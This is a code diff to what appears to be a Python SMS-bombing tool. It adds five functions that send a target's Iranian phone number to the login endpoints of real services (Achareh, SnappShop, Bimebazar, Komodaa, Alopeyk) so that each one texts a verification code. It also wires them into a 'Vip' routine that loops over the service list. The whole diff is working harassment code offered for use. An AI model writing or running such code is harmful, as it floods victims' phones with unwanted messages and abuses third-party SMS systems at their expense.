@@ -83,7 +83,75 @@ def ragham_call(phone):
         print(f'{r}[!] Ragham - Call Exception: {e}{a}')
         return False
 
+def achareh(phone):
+    url = "https://api.achareh.co/v2/accounts/login/"
+    payload = {"phone": "98" + phone.split("+98")[1]}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Achareh) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Achareh) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Achareh Exception: {e}{a}')
+        return False
 
+def snappshop(phone):
+    url = "https://apix.snappshop.co/auth/v1/pre-login"
+    payload = {"mobile": "0" + phone.split("+98")[1]}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(SnappShop) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (SnappShop) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] SnappShop Exception: {e}{a}')
+        return False
+
+def bimebazar(phone):
+    url = "https://bimebazar.com/accounts/api/login_sec/"
+    payload = {"username": "0" + phone.split("+98")[1]}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Bimebazar) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Bimebazar) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Bimebazar Exception: {e}{a}')
+        return False
+
+def komodaa(phone):
+    url = "https://api.komodaa.com/api/v2.6/loginRC/request"
+    payload = {"phone_number": "0" + phone.split("+98")[1]}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Komodaa) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Komodaa) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Komodaa Exception: {e}{a}')
+        return False
+
+def alopeyk_safir(phone):
+    url = "https://api.alopeyk.com/safir-service/api/v1/login"
+    payload = {"phone": "0" + phone.split("+98")[1]}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Alopeyk Safir) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Alopeyk Safir) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Alopeyk Safir Exception: {e}{a}')
+        return False
 
 def snap(phone):
     snapH = {"Host": "app.snapp.taxi", "content-type": "application/json"}
@@ -241,7 +309,8 @@ def Vip(phone, Time):
     snap, gap, divar, alibaba, mek, okorosh,
     drnext, pindo, shahrfarsh, tetherland, snapp_market,
     trip_call, paklean_call, ragham_call,
-    digikala, barghman
+    digikala, barghman,
+    achareh, snappshop, bimebazar, komodaa, alopeyk_safir
 ]
     total_services = len(services)
     
